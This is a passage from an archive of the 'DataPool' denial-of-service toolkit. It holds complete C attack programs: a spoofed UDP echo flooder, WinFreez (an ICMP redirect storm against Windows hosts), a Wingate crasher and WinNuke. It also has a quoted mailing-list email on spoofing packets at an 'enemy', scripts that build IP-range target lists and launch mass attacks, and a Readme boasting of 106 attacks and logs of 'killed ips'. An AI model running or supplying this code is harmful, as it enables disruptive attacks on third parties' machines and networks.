            "\tfprintf(stderr,\"usage: %s sourcename sourceport destinationname destinationport\\n\",*argv);",
            "\texit(1);",
            "if((he=gethostbyname(argv[1]))==NULL)",
            "\tfprintf(stderr,\"can't resolve source hostname\\n\");",
            "\texit(1);",
            "bcopy(*(he->h_addr_list),(gram+12),4);",
            "if((he=gethostbyname(argv[3]))==NULL)",
            "\tfprintf(stderr,\"can't resolve destination hostname\\n\");",
            "\texit(1);",
            "bcopy(*(he->h_addr_list),(gram+16),4);",
            "*(u_short*)(gram+20)=htons((u_short)atoi(argv[2]));",
            "*(u_short*)(gram+22)=htons((u_short)atoi(argv[4]));",
            "p=(struct sockaddr_in*)&sa;",
            "p->sin_family=AF_INET;",
            "bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));",
            "if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)",
            "\tperror(\"socket\");",
            "\texit(1);",
            "#ifdef IP_HDRINCL",
            "fprintf(stderr,\"we have IP_HDRINCL :-)\\n\\n\");",
            "if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)",
            "\tperror(\"setsockopt IP_HDRINCL\");",
            "\texit(1);",
            "        };",
            "#else",
            "fprintf(stderr,\"we don't have IP_HDRINCL :-(\\n\\n\");",
            "#endif",
            "if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct sockaddr)))== -1)",
            "\tperror(\"sendto\");",
            "\texit(1);",
            "printf(\"datagram sent without error:\");",
            "for(x=0;x<(sizeof(gram)/sizeof(u_char));x++)",
            "\tif(!(x%4)) putchar('\\n');",
            "\tprintf(\"%02x\",gram[x]);",
            "putchar('\\n');",
            "From route@infonexus.com Wed Feb  7 12:33:42 1996",
            "Return-Path: route",
            "Received: (from route@localhost) by onyx.infonexus.com (8.6.12/8.6.9) id MAA16853 for root; Wed, 7 Feb 1996 12:33:42 -0800",
            "From: Infinity <route@infonexus.com>",
            "Message-Id: <199602072033.MAA16853@onyx.infonexus.com>",
            "Subject: Re: BoS: Re: Echo Vunerebility (fwd)",
            "To: root@infonexus.com (demon)",
            "Date: Wed, 7 Feb 1996 12:33:41 -0800 (PST)",
            "X-Mailer: ELM [version 2.4 PL24]",
            "MIME-Version: 1.0",
            "Content-Type: text/plain; charset=US-ASCII",
            "Content-Transfer-Encoding: 7bit",
            "Content-Length: 1068      ",
            "Status: RO",
            "Hadmut Danisch braved the dark, cold unknown with:",
            ">From owner-best-of-security@suburbia.net Wed Feb  7 04:39:35 1996",
            "X-Authentication-Warning: suburbia.net: majordom set sender to owner-best-of-security using -f",
            "Date: Wed, 7 Feb 1996 12:42:17 +0100",
            "From: danisch@ira.uka.de (Hadmut Danisch)",
            "Message-Id: <9602071142.AA00605@elysion.eiss.ira.uka.de>",
            "To: best-of-security@suburbia.net",
            "Subject: Re: BoS: Re: Echo Vunerebility",
            "X-Sun-Charset: US-ASCII",
            "Sender: owner-best-of-security@suburbia.net",
            "Errors-to: nobody@mail.uu.net",
            "Precedence: bulk",
            "Reply-To: nobody@mail.uu.net",
            "> Try sending a packet from port 7 your ip to port 7 your ip.",
            "Send a udp packet to your enemy's ip address, for both port",
            "numbers use one of echo/chargen/time , and use either",
            "127.0.0.1 or broadcast as the From-address.",
            "He will have a lot of fun...",
            "Hadmut Danisch",
            "European Institute for System Security E.I.S.S.",
            "infiNity .oOo.  Member of the infamous Guild |  spreading information ",
            "route .oOo.  Use strong Cryptography |  like it was going ",
            "daemon9 .oOo.  Finger for info |  out of style",
            "datapool/src/udpflood.c",
            "0100644",
            "0000000",
            "0000000",
            "00000003412",
            "06641217101",
            "014125",
            "ustar  ",
            "root",
            "root",
            "#include<sys/types.h>",
            "#include<sys/socket.h>",
            "#include<netinet/in_systm.h>",
            "#include<netinet/in.h>",
            "#include<netinet/ip.h>",
            "#include<netinet/udp.h>",
            "#include<errno.h>",
            "#include<string.h>",
            "#include<netdb.h>",
            "#include<arpa/inet.h>",
            "#include<stdio.h>",
            "struct sockaddr sa;",
            "main(int argc,char **argv)",
            "int fd;",
            "int x=1;",
            "struct sockaddr_in *p;",
            "struct hostent *he;",
            "int numpackets;",
            "u_char gram[38]=",
            "\t0x45,\t0x00,\t0x00,\t0x26,",
            "\t0x12,\t0x34,\t0x00,\t0x00,",
            "\t0xFF,\t0x11,\t0,\t0,",
            "\t0,\t0,\t0,\t0,",
            "\t0,\t0,\t0,\t0,",
            "\t0,\t0,\t0,\t0,",
            "\t0x00,\t0x12,\t0x00,\t0x00,",
            "\t'1','2','3','4','5','6','7','8','9','0'",
            "if(argc!=4)",
            "\tfprintf(stderr,\"usage: %s sourcename destinationname numpackets\\n\",*argv);",
            "\texit(1);",
            "numpackets = atoi(argv[3]);",
            "fprintf(stderr,\"Will flood %d times\",numpackets);",
            "if((he=gethostbyname(argv[1]))==NULL)",
            "\tfprintf(stderr,\"can't resolve source hostname\\n\");",
            "\texit(1);",
            "bcopy(*(he->h_addr_list),(gram+12),4);",
            "if((he=gethostbyname(argv[2]))==NULL)",
            "\tfprintf(stderr,\"can't resolve destination hostname\\n\");",
            "\texit(1);",
            "bcopy(*(he->h_addr_list),(gram+16),4);",
            "*(u_short*)(gram+20)=htons((u_short)7);",
            "*(u_short*)(gram+22)=htons((u_short)7);",
            "p=(struct sockaddr_in*)&sa;",
            "p->sin_family=AF_INET;",
            "bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));",
            "if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)",
            "\tperror(\"socket\");",
            "\texit(1);",
            "#ifdef IP_HDRINCL",
            "fprintf(stderr,\"\\nWe have IP_HDRINCL \\n\\n\");",
            "if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)",
            "\tperror(\"setsockopt IP_HDRINCL\");",
            "\texit(1);",
            "        };",
            "#else",
            "fprintf(stderr,\"\\nWe don't have IP_HDRINCL \\n\\n\");",
            "#endif",
            "printf(\"\\nNumber of Packets sent:\\n\\n\");",
            "for(x=0;x<numpackets;x++)",
            "if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct sockaddr)))== -1)",
            "\tperror(\"sendto\");",
            "\texit(1);",
            "printf(\"%d \",x);",
            "datapool/src/winfreez.c",
            "0100644",
            "0000000",
            "0000000",
            "00000016433",
            "07055651022",
            "014155",
            "ustar  ",
            "root",
            "root",
            " WinFreez.c by Delmore <delmore@moscowmail.com>",
            " ICMP/Redirect-host message storm freeze Win9x/NT(sp4) box",
            " in LAN.",
            " Usage: winfreez sendtoip sendfromip time",
            " where <sendtoip> is victim host, <sendfromip> is router",
            " for victim host, <time> is time in seconds to freeze victim.",
            " Note:",
            " I've written small exploit for freeze win9x/nt boxes in LAN.",
            " Proggy initiates ICMP/Redirect-host messages storm from router",
            " (use router ip). Windows will receive redirect-host messages",
            " and change own route table, therefore it will be frozen",
            " or slowly working during this time.",
            " On victim machine route table changes viewing with:",
            " ROUTE PRINT",
            " command in ms-dos box.",
            " Exploit show different result for different system configuration.",
            " System results:",
            " p200/16ram/win95osr2 is slowly execute application",
            " after 20 seconds of storm.",
            " p233/96ram/nt4-sp4 is slowly working after 30",
            " seconds of storm.",
            " p2-266/64ram/win95 working slowly and can't normal execute",
            " application.",
            " Compiled on RedHat Linux 5, Kernel 2.0.35 (x86)",
            " gcc ./winfreez.c -o winfreez",
            " --- for Slackware Linux, Kernel 2.0.30",
            " If you can't compile due to ip_sum not defined errors,",
            " replace (line 207):",
            "  ip->ip_sum = 0;",
            " to line:",
            "  ip->ip_csum = 0;",
            " ---",
            " Soldiers Of Satan group",
            " Russia, Moscow State University, 05 march 1999",
            " http://sos.nanko.ru",
            " Thanx to Mark Henderson.",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <time.h>",
            "#include <string.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "/*#include <netinet/ip_icmp.h>*/",
            "#define ICMP_REDIRECT           5",
            " * Structure of an icmp header (from sparc header).",
            "struct icmp {",
            " u_char icmp_type; /* type of message, see below */",
            " u_char icmp_code; /* type sub code */",
            " u_short icmp_cksum; /* ones complement cksum of struct */",
            "union {",
            " u_char ih_pptr; /* ICMP_PARAMPROB */",
            " struct in_addr ih_gwaddr; /* ICMP_REDIRECT */",
            " struct ih_idseq {",
            " n_short icd_id;",
            " n_short icd_seq;",
            "} ih_idseq;",
            "int ih_void;",
            "} icmp_hun;",
            "#define icmp_pptr icmp_hun.ih_pptr",
            "#define icmp_gwaddr icmp_hun.ih_gwaddr",
            "#define icmp_id icmp_hun.ih_idseq.icd_id",
            "#define icmp_seq icmp_hun.ih_idseq.icd_seq",
            "#define icmp_void icmp_hun.ih_void",
            "union {",
            " struct id_ts {",
            " n_time its_otime;",
            " n_time its_rtime;",
            " n_time its_ttime;",
            "} id_ts;",
            "struct id_ip  {",
            "struct ip idi_ip;",
            "/* options and then 64 bits of data */",
            "} id_ip;",
            "u_long id_mask;",
            "char id_data[1];",
            "} icmp_dun;",
            "#define icmp_otime icmp_dun.id_ts.its_otime",
            "#define icmp_rtime icmp_dun.id_ts.its_rtime",
            "#define icmp_ttime icmp_dun.id_ts.its_ttime",
            "#define icmp_ip icmp_dun.id_ip.idi_ip",
            "#define icmp_mask icmp_dun.id_mask",
            "#define icmp_data icmp_dun.id_data",
            "u_short in_cksum (u_short *addr, int len);",
            "void attack( char *sendtoip, char *sendfromip, time_t wtime, int s );",
            "void main (int argc, char **argv)",
            "  time_t wtime;",
            "  char *sendtoip, *sendfromip;",
            "  int s, on;",
            "  if (argc != 4)",
            "    {",
            "      fprintf (stderr, \"usage: %s sendto sendfrom time\\n\", argv[0]);",
            "      exit (1);",
            "    }",
            "  sendtoip = (char *)malloc(strlen(argv[1]) + 1);",
            "  strcpy(sendtoip, argv[1]);",
            "  sendfromip = (char *)malloc(strlen(argv[2]) + 1);",
            "  strcpy(sendfromip, argv[2]);",
            "  wtime = atol(argv[3]);",
            "  if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      fprintf (stderr, \"socket creation error\\n\" );",
            "      exit (1);",
            "    }",
            "#ifdef IP_HDRINCL",
            "  if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, &on, sizeof (on)) < 0)",
            "    {",
            "      fprintf (stderr, \"sockopt IP_HDRINCL error\\n\" );",
            "      exit (1);",
            "    }",
            "#endif",
            "  printf(\"winfreez by Delmore, <delmore@moscowmail.com>\\n\");",
            "  printf(\"Soldiers Of Satan group, http://sos.nanko.ru\\n\\n\");",
            "  printf(\"sendto = %s\\n\", sendtoip);",
            "  printf(\"sendfrom = %s\\n\", sendfromip);",
            "  printf(\"time = %i s\\n\", wtime);",
            "  attack( sendtoip, sendfromip, wtime, s );",
            "  free( (void *) sendtoip );",
            "  free( (void *) sendfromip );",
            "void attack( char *sendtoip, char *sendfromip, time_t wtime, int s )",
            "  time_t curtime, endtime;",
            "  int i1, i2, i3, i4;",
            "  char redir[21];",
            "  char buf[100];",
            "  struct ip *ip = (struct ip *) buf;",
            "  struct icmp *icmp = (struct icmp *) (ip + 1);",
            "  struct hostent *hp;",
            "  struct sockaddr_in dst;",
            "  if(wtime==0) return;",
            "  if ((hp = gethostbyname (sendtoip)) == NULL)",
            "   if ((ip->ip_dst.s_addr = inet_addr (sendtoip)) == -1)",
            "     {",
            "      fprintf (stderr, \"%s: unknown sendto\\n\", sendtoip);",
            "      exit (1);",
            "     }",
            "  if ((hp = gethostbyname (sendfromip)) == NULL)",
            "   if ((ip->ip_src.s_addr = inet_addr (sendfromip)) == -1)",
            "     {",
            "      fprintf (stderr, \"%s: unknown sendfrom\\n\", sendfromip);",
            "      exit (1);",
            "     }",
            "  endtime = time(NULL) + wtime;",
            "  srand((unsigned int) endtime);",
            " do {",
            "  bzero (buf, sizeof buf);",
            "  /* sendto/gateway */",
            "  hp = gethostbyname (sendtoip);",
            "  bcopy (hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);",
            "  bcopy (hp->h_addr_list[0], &icmp->icmp_gwaddr.s_addr, hp->h_length);",
            "  /* sendfrom */",
            "  hp = gethostbyname (sendfromip);",
            "  bcopy (hp->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);",
            "  /* generate redirect*/",
            "  i1 = 1+(int) (223.0*rand()/(RAND_MAX+1.0));",
            "  i2 = 1+(int) (253.0*rand()/(RAND_MAX+1.0));",
            "  i3 = 1+(int) (253.0*rand()/(RAND_MAX+1.0));",
            "  i4 = 1+(int) (253.0*rand()/(RAND_MAX+1.0));",
            "  bzero (redir, sizeof redir);",
            "  sprintf(redir,\"%u.%u.%u.%u\", i4, i3, i2, i1 );",
            "  hp = gethostbyname (redir);",
            "  bcopy (hp->h_addr_list[0], &icmp->icmp_ip.ip_dst.s_addr, hp->h_length);",
            "  ip->ip_v = 4;",
            "  ip->ip_hl = sizeof *ip >> 2;",
            "  ip->ip_tos = 0;",
            "  ip->ip_len = htons (sizeof buf);",
            "  ip->ip_id = htons (4321);",
            "  ip->ip_off = 0;",
            "  ip->ip_ttl = 255;",
            "  ip->ip_p = 1;",
            "  ip->ip_sum = 0;               /* kernel fills this in */",
            "  bcopy (&ip->ip_dst.s_addr, &icmp->icmp_ip.ip_src.s_addr, sizeof(ip->ip_dst.s_addr));",
            "  icmp->icmp_ip.ip_v = 4;",
            "  icmp->icmp_ip.ip_hl = sizeof *ip >> 2;",
            "  icmp->icmp_ip.ip_tos = 0;",
            "  icmp->icmp_ip.ip_len = htons (100);   /* doesn't matter much */",
            "  icmp->icmp_ip.ip_id = htons (3722);",
            "  icmp->icmp_ip.ip_off = 0;",
            "  icmp->icmp_ip.ip_ttl = 254;",
            "  icmp->icmp_ip.ip_p = 1;",
            "  icmp->icmp_ip.ip_sum = in_cksum ((u_short *) & icmp->icmp_ip, sizeof *ip);",
            "  dst.sin_addr = ip->ip_dst;",
            "  dst.sin_family = AF_INET;",
            "  icmp->icmp_type = ICMP_REDIRECT;",
            "  icmp->icmp_code = 1; /* 1 - redirect host, 0 - redirect net */",
            "  icmp->icmp_cksum = in_cksum ((u_short *) icmp, sizeof (buf) - sizeof(*ip));",
            "  if( sendto( s, buf, sizeof buf, 0, (struct sockaddr *) &dst, sizeof dst) < 0 )",
            "    {",
            "      fprintf (stderr, \"sendto error\\n\");",
            "      exit (1);",
            "    }",
            "  }while (time(NULL)!=endtime);",
            " * in_cksum -- Checksum routine for Internet Protocol family headers (C",
            " * Version) - code from 4.4 BSD",
            "u_short in_cksum (u_short *addr, int len)",
            "  register int nleft = len;",
            "  register u_short *w = addr;",
            "  register int sum = 0;",
            "  u_short answer = 0;",
            "  /*",
            "   * Our algorithm is simple, using a 32 bit accumulator (sum), we add",
            "   * sequential 16 bit words to it, and at the end, fold back all the",
            "   * carry bits from the top 16 bits into the lower 16 bits.",
            "   */",
            "  while (nleft > 1)",
            "    {",
            "      sum += *w++;",
            "      nleft -= 2;",
            "    }",
            "  /* mop up an odd byte, if necessary */",
            "  if (nleft == 1)",
            "    {",
            "      *(u_char *) (&answer) = *(u_char *) w;",
            "      sum += answer;",
            "    }",
            "  /* add back carry outs from top 16 bits to low 16 bits */",
            "  sum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */",
            "  sum += (sum >> 16);           /* add carry */",
            "  answer = ~sum;                /* truncate to 16 bits */",
            "  return (answer);",
            "datapool/src/wingatecrash.c",
            "0100644",
            "0000000",
            "0000000",
            "00000004652",
            "06643044447",
            "015014",
            "ustar  ",
            "root",
            "root",
            "/* Blah, blah, blah, I am not liable for anything this program",
            "   does, or what anyone does with it.  THIS PROGRAM COMES WITH",
            "   NO WARRANTY, AND THE AUTHOR IS IN NO EVENT LIABLE FOR ANYTHING",
            "   THAT HAPPENS WITH IT, INCLUDING IF IT SCREWS YOUR SYSTEM, OR",
            "   SOMEONE USES IT TO SCREW YOUR SYSTEM, OR YOU GET IN TROUBLE",
            "   FOR SCREWING SOMEONE'S SYSTEM.  This program is for auditing",
            "   your own system only, not for DoS attacks. I am not liable",
            "   for anything you or anyone else does with this program.  This",
            "   program is for auditing and informational purposes only!",
            "/* Feel free to modify this shit, but give me credit.",
            "   11/14/1998 holobyte",
            "   holobyte@holobyte.org",
            "/* Based on the bugtraq release by g23@usa.net */",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <stdio.h>",
            "#include <netdb.h>",
            "#include <unistd.h>",
            "#include <netinet/in.h>",
            "main (int argc, char *argv[]) {",
            "\tint sockfd;",
            "\tstruct sockaddr_in staddr;",
            "\tint port;",
            "\tstruct hostent *tmp_host;",
            "\tunsigned long int addr;",
            "\tint connfd;",
            "\tint i;",
            "\tprintf(\"Wingate crasher by holobyte <holobyte@holobyte.org>\\n\\n\");",
            "\tif (argc != 2 && argc != 3) { printf(\"Usage: %s <wingate> [port(defualt=23)]\\n\",argv[0]); exit(1); }",
            "\tif (argc == 2) { port=23; } else { port=atoi(argv[2]); }",
            "\tif (!(port > 0 && port < 65536)) { printf(\"Invalid port\\n\"); exit(2); }",
            "\t/* If this returns -1 we'll try to look it up.  I don't assume anyone will be putting",
            "\tin 255.255.255.255, so I'll go with inet_addr() */",
            "\tbzero(&staddr,sizeof(staddr));",
            "\tif ((staddr.sin_addr.s_addr = inet_addr(argv[1])) == -1) {",
            "\t\ttmp_host = gethostbyname(argv[1]);",
            "\t\tif (tmp_host == NULL) { printf(\"Could not get valid addr info on %s: tmp_host\\n\",argv[1]); exit(7);} else {",
            "\t\t\tmemcpy((caddr_t *)&staddr.sin_addr.s_addr,tmp_host->h_addr,tmp_host->h_length);",
            "\t\t\tif (staddr.sin_addr.s_addr == -1) { printf(\"Could not valid addr info on %s: addr -1\\n\",argv[1]); exit(8); }",
            "\tif ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) { perror(\"Socket\"); exit(3); }",
            "\tstaddr.sin_family = AF_INET;",
            "\tstaddr.sin_port = htons(port);",
            "\tif (connect(sockfd, (struct sockaddr *) &staddr, sizeof(staddr)) < 0) { perror(\"Connect\"); exit(4); }",
            "\tprintf(\"Connected... Crashing\");",
            "\tfor (i=0;i<100;i++) {",
            "\t\tif ((write(sockfd,\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\",44)) < 0) { perror(\"Write\"); exit(5); }",
            "\t\tputc('.',stdout);",
            "\t\tfflush(stdout);",
            "\tif (write(sockfd,\"\\n\",1) < 0) { perror(\"Final Write\"); exit(6); }",
            "\tputc('\\n',stdout);",
            "\tfflush(stdout);",
            "\tclose(sockfd);",
            "datapool/src/winnuke.c",
            "0100644",
            "0000000",
            "0000000",
            "00000003154",
            "07100656542",
            "014003",
            "ustar  ",
            "root",
            "root",
            "/* winnuke.c - (05/07/97)  By _eci  */",
            "/* Tested on Linux 2.0.30, SunOS 5.5.1, and BSDI 2.1 */",
            "#include <stdio.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <unistd.h>",
            "#define dport 139  /* Attack port: 139 is what we want */",
            "int x, s;",
            "char *str = \"Bye\";  /* Makes no diff */",
            "struct sockaddr_in addr, spoofedaddr;",
            "struct hostent *host;",
            "int open_sock(int sock, char *server, int port) {",
            "     struct sockaddr_in blah;",
            "     struct hostent *he;",
            "     bzero((char *)&blah,sizeof(blah));",
            "     blah.sin_family=AF_INET;",
            "     blah.sin_addr.s_addr=inet_addr(server);",
            "     blah.sin_port=htons(port);",
            "    if ((he = gethostbyname(server)) != NULL) {",
            "        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);",
            "    }",
            "    else {",
            "         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {",
            "           perror(\"gethostbyname()\");",
            "           return(-3);",
            "         }",
            "    }",
            "        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {",
            "             perror(\"connect()\");",
            "             close(sock);",
            "             return(-4);",
            "        }",
            "        printf(\"Connected to [%s:%d].\\n\",server,port);",
            "        return;",
            "void main(int argc, char *argv[]) {",
            "     if (argc != 2) {",
            "       printf(\"Usage: %s <target>\\n\",argv[0]);",
            "       exit(0);",
            "     }",
            "     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {",
            "        perror(\"socket()\");",
            "        exit(-1);",
            "     }",
            "     open_sock(s,argv[1],dport);",
            "     printf(\"Sending crash... \");",
            "       send(s,str,strlen(str),MSG_OOB);",
            "     printf(\"Done!\\n\");",
            "     close(s);",
            "datapool/src/compile.sh",
            "0100755",
            "0000000",
            "0000000",
            "00000000554",
            "07071377652",
            "014160",
            "ustar  ",
            "root",
            "root",
            "#!/bin/bash",
            "for file in ./*.c",
            "        file=`basename $file`",
            "\techo -n \"Compiling $file...\"",
            "        exe=./`echo $file |cut -d. -f1`",
            "        if cc -o $exe $file 1>/dev/null 2>/dev/null",
            "        then",
            "                echo `basename $exe`\" was compiled.\"",
            "        else",
            "                echo `basename $exe`\" could not be compiled. Try doing it manually\"",
            "        fi",
            "done",
            "datapool/cipgen.sh",
            "0100755",
            "0000000",
            "0000000",
            "00000010210",
            "07076716027",
            "013172",
            "ustar  ",
            "root",
            "root",
            "#!/bin/bash",
            "RESPONSE=",
            "while [ -z \"$RESPONSE\" ];",
            "clear",
            "echo \"Please enter the base of an IP with a trailing \\\".\\\"\"",
            "echo \"The program will create a file called ips.txt which will\"",
            "echo \"include all of the ips with that base.\"",
            "echo \"eg: 127.0.0.  -> all ips that start with 127.0.0. (Class C)\"",
            "echo \"    127.0.    -> all ips that start with 127.0. (Class B)\"",
            "#really wish i wouldn't have to put this in here...but hey, if u wanna",
            "#take down all of AOL...more power to ya=P",
            "echo \"    127.      -> all ips that start with 127. (Class A=])\"",
            "read RESPONSE",
            "done",
            "IPLEN=`echo $RESPONSE | wc -c`",
            "IPLEN=`echo $IPLEN`",
            "IPLEN=`expr $IPLEN - 1`",
            "x2=1",
            "CLASSCNT=0",
            "while [ $x2 -le $IPLEN ]",
            "IPCAP=`echo $RESPONSE | cut -b-$x2 | cut -b$x2-`",
            "if [ \"$IPCAP\" = \".\" ]; then",
            "CLASSCNT=`expr $CLASSCNT + 1`",
            "x2=`expr $x2 + 1`",
            "done",
            "case $CLASSCNT in",
            "echo \"Generating Class A IP list for $RESPONSE ...\"",
            "x3=1",
            "for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 78 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255",
            "for b in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 78 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255",
            "while [ $x3 -le 255 ]",
            "printf \".\"",
            "echo \"$RESPONSE$i.$b.$x3\" >> ./ips.txt",
            "x3=`expr $x3 + 1`",
            "done",
            "x3=1",
            "printf \".\"",
            "done",
            "done",
            "echo \"File sucessfully written.\"",
            "echo \"Generating Class B IP list for $RESPONSE ...\"",
            "x3=1",
            "for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 78 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255",
            "while [ $x3 -le 255 ]",
            "printf \".\"",
            "echo \"$RESPONSE$i.$x3\" >> ./ips.txt",
            "x3=`expr $x3 + 1`",
            "done",
            "x3=1",
            "printf \".\"",
            "done",
            "echo \"File sucessfully written.\"",
            "echo \"Generating Class C IP list for $RESPONSE ...\"",
            "while [ $x -le 255 ] ",
            "printf \".\"",
            "echo \"$RESPONSE$x\" >> ./ips.txt",
            "x=`expr $x + 1`",
            "done",
            "echo \"File sucessfully written.\"",
            "esac",
            "datapool/Readme",
            "0100644",
            "0000000",
            "0000000",
            "00000004023",
            "07101432171",
            "012473",
            "ustar  ",
            "root",
            "root",
            "Quick rundown of everything in this script and what it does:",
            "Readme - What you're reading right now=P",
            "Changelog - History of the various changes in the script",
            "cipgen.sh - Script for generating the ips in a a, b, or c-class subnet",
            "datamass.sh - Script for attacking multiple hosts",
            "datapool.sh - Script for attack a single host",
            "datapool.fc - Holds information on attacks as well as other functions",
            "datapool.db - Where records of killed ips are kept.",
            "cleaner.sh - Runs cleanup code such as killing lingering procs and clearing files",
            "Author of DataPool: spender",
            "Email address: spender@exterminator.net",
            "Current Version: 3.3",
            "Features:",
            "* Multiple IP attacks * Logging * Scan only option",
            "* Connection Watching * Timed attacks * Enhanced attacks",
            "* Looping attacks * \"Don't stop till they drop\"",
            "* 106 DoS attacks * Line speed option * Portless attacks",
            "* Port range specification * Random source IP generation",
            "* \"Smart\" attacks * Continuous attacks * Simultaneous attacks",
            "* Specific attacks",
            "Almost all attacks edited to execute faster, provide more features, or",
            "just plain work;)",
            "executing ./datapool.sh will give you the list of options with an explaination",
            "of each.  options for datamass.sh vary slightly from datapool.sh so make sure",
            "you act accordingly.",
            "Note that since the attacks are edited, they run MUCH faster than normal...",
            "A fast connect is recommended, but not required...u'll just have some ",
            "bottleneck on your end.  Try to limit the amount of simultaneous attacks you",
            "try to run...especially if you have a small amount of ram in your machine...",
            "the throughput of the attacks can easily reach over 1MB/s...",
            "For hosts that have pings blocked(lameasses=P), just use the -c option...since",
            "they feel like blocking pings...we just take them out all together...now no",
            "more pingy pingy that slows down the script...just attack after attack after",
            "attack;)  and u can still portscan them...so actually this option might be ",
            "better if u wanna keep a steady stream on the guy;)  uhmmm sex is good and",
            "girls are good, but both at the same time is better...cuz g0ats suck=\\",
            "datapool/datamass.sh",
            "0100755",
            "0000000",
            "0000000",
            "00000004772",
            "07100667770",
            "013540",
            "ustar  ",
            "root",
            "root",
            "#!/bin/bash",
            "if [ ! -f ./ips.txt ]; then",
            "    echo \"Please create ./ips.txt with a list of IPs to attack before running.\"",
            "    exit 1",
            "if [ ! -f ./datapool.fc ]; then",
            "    echo \"Dude, wtf were u thinking?? Don't delete datapool.fc dumbass!!!\"",
            "    exit 1",
            ". ./datapool.fc",
            "function usage2 {",
            "    echo \"Usage: $0 [-i] [source ip] [-v] [logfile] [-p] [portlow-porthigh] \"",
            "    echo \"[-s] [-l] [T1|T3|OC3|Modem|Slowass] [-x] [-k] [-a] [-t] [# of attacks]\"",
            "    echo \"[-r] [attackname]\"",
            "    echo \"Options:\"",
            "    echo \"[-p]: Specifies port range to scan.  ex: -p 1-1024\"",
            "    echo \"[-x]: \\\"Don't stop till they drop\\\"\"",
            "    echo \"[-v]: Logs results of scan to file.  ex: -v logfile.log\"",
            "    echo \"[-s]: Scan ports only.\"",
            "    echo \"[-l]: Specifies line speed.  Choose from T1,T3, and Modem.\"",
            "    echo \"[-i]: Specifies source IP.  ex: -i 127.0.0.1\"",
            "    echo \"[-k]: Wait till host is online, then attack.\"",
            "    echo \"[-a]: Loop attack. (Used with -k and -x can keep a connection dropped.)\"",
